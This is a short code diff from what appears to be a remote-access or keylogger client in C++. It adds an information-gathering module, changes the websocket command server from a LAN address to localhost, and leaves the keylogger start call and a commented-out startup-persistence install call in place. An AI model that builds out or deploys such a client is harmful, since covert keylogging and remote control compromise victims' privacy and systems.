@@ -7,6 +7,7 @@
 #include <random>
 #include "Stream.h"
 #include "configuration.h"
+#include "Information.h"
 #include "ClientSocket.h"
 
 
@@ -97,9 +98,14 @@ int main(int argc = 0, char *argv[] = nullptr) {
         keyLogger.tryStart();
         //Install::installClient(INSTALL_PATH, argv[0], SUBDIRECTORY_NAME, SUBDIRECTORY_FILE_NAME, STARTUP_NAME);
         bool isConnecting = true;
-        std::string uri = "ws://192.168.1.133:8080";
-        ClientSocket clientSocket(uri);
+        std::string uri = "ws://localhost:8080";
+
+        ClientSocket clientSocket(uri, actionMap);
+        Information information(clientSocket);
         clientSocket.startConnection();
+
+
+
         bool streamListening = true;
         while (isConnecting) {
 
